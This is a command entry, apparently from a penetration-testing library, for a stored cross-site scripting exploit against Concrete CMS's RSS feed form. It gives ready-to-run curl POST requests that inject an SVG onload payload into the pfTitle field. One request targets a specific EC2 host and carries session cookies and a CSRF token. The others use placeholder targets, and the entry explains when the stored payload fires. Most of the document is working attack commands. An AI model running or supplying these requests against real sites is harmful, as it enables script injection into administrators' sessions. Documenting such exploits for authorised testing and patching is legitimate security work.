---
id: cmd-curl-xss-rss-001
name: curl-add-xss-rss-feed
type: command
executor: bash
data: >-
  curl -X POST
  'http://ec2-34-200-232-193.compute-1.amazonaws.com/index.php/dashboard/pages/feeds/add_feed'
  -H 'Host: ec2-34-200-232-193.compute-1.amazonaws.com' -H 'User-Agent:
  Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0' -H
  'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H
  'Accept-Language: en-US,en;q=0.5' -H 'Referer:
  http://ec2-34-200-232-193.compute-1.amazonaws.com/index.php/dashboard/pages/feeds/add'
  -H 'Cookie: CONCRETE5=qgl7qbdhh6le0jph3f07uo6eu0; CONCRETE5_LOGIN=1;
  dashboardPanelStatus=closed' -H 'Connection: close' -H
  'Upgrade-Insecure-Requests: 1' -H 'Content-Type:
  application/x-www-form-urlencoded' -H 'Content-Length: 351' --data-raw
  'ccm_token=1492345382%3A9f0e473b3d4455fe197861e0fa77d671&pfTitle=%22%3E%3Csvg%2Fonload%3Dconfirm%28document.domain%29%3E&pfHandle=cdl&pfDescription=cdl&iconFID=0&cParentID=0&ptID=0&customTopicAttributeKeyHandle=&customTopicTreeNodeID=0&pfIncludeAllDescendents=0&pfDisplayAliases=0&pfDisplayFeaturedOnly=0&pfContentToDisplay=S&pfAreaHandleToDisplay=Main'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:47.057Z'
platforms:
  - Linux
  - Windows
  - macOS
tags:
  - xss
  - web-exploit
  - curl
verified: false
validated: true
submitted: true
---

# curl-add-xss-rss-feed

## Command

```bash
curl -X POST 'http://target.com/index.php/dashboard/pages/feeds/add_feed' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: CONCRETE5=your_session; CONCRETE5_LOGIN=1' \
  --data-raw 'ccm_token=your_token&pfTitle=%22%3E%3Csvg%2Fonload%3Dconfirm%28document.domain%29%3E&pfHandle=test&pfDescription=test&...'
```

## Description

This command uses curl to submit a malicious RSS feed form in Concrete CMS, injecting a stored XSS payload into the pfTitle parameter. It reproduces the vulnerability by sending a POST request with an unsanitized JavaScript payload, storing it for later execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `-H 'Content-Type: ...'` | Sets the form data type | Yes |
| `-H 'Cookie: ...'` | Includes session cookies for authentication | Yes |
| `--data-raw` | The form data with encoded payload (pfTitle contains `%22%3E%3Csvg%2Fonload%3Dconfirm%28document.domain%29%3E`) | Yes |
| `ccm_token` | CSRF token from the form | Yes |
| `pfTitle` | Vulnerable title field with XSS payload | Yes |
| `pfHandle` | Feed handle (e.g., 'cdl') | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'http://target.com/index.php/dashboard/pages/feeds/add_feed' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: your_cookies' -d 'ccm_token=token&pfTitle=%22%3E%3Csvg%2Fonload%3Dconfirm%28document.domain%29%3E&pfHandle=test'
```

### Advanced Usage

```bash
curl -X POST 'http://target.com/index.php/dashboard/pages/feeds/add_feed' \
  -H 'User-Agent: Mozilla/5.0 ...' \
  -H 'Referer: http://target.com/add' \
  -H 'Cookie: CONCRETE5=session; CONCRETE5_LOGIN=1' \
  -d 'ccm_token=1492345382%3A9f0e473b3d4455fe197861e0fa77d671&pfTitle=%22%3E%3Csvg%2Fonload%3Dconfirm%28document.domain%29%3E&pfHandle=cdl&pfDescription=cdl&iconFID=0&cParentID=0&ptID=0&pfIncludeAllDescendents=0&pfDisplayAliases=0&pfDisplayFeaturedOnly=0&pfContentToDisplay=S&pfAreaHandleToDisplay=Main'
```

## Expected Output

A successful response (HTTP 200 or 302 redirect) indicating the feed was added, with HTML confirming submission. The payload is now stored; no immediate execution, but triggers on viewing `/dashboard/pages/feeds`.

## Related

- [[procedures/Exploit-Stored-XSS-in-Concrete-CMS-RSS-Feed]]
